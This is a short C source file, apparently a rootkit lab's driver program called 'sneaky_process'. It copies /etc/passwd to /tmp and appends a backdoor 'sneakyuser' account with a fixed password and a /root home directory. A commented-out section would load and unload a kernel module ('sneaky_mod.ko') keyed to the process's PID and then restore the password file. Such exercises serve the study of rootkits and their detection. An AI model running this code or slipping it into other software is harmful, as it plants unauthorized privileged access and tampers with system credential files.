#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>


int main(void){
  // 1. print its own process ID
  printf("sneaky_process pid = %d\n", getpid());

  // 2. copy the /etc/passwd file (used for user authentication) to a new file: /tmp/passwd
  //copy /etc/passwd to tmp/passwd and print new line
  system("cp /etc/passwd /tmp");
  system("echo \'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n\' >> /etc/passwd");

  /*// 3. load sneaky module
  char message[50];
  sprintf(message, "insmod sneaky_mod.ko pid=%d", getpid());
  system(message);

  // 4. while loop
  int inputChar;
  while ((inputChar = getchar()) != 'q');

  // 5. unload sneaky module
  system("rmmod sneaky_mod");

  // 6. resore password file
  system("cp /tmp/passwd /etc");
  system("rm -rf /tmp/passwd");*/

  exit(EXIT_SUCCESS);
}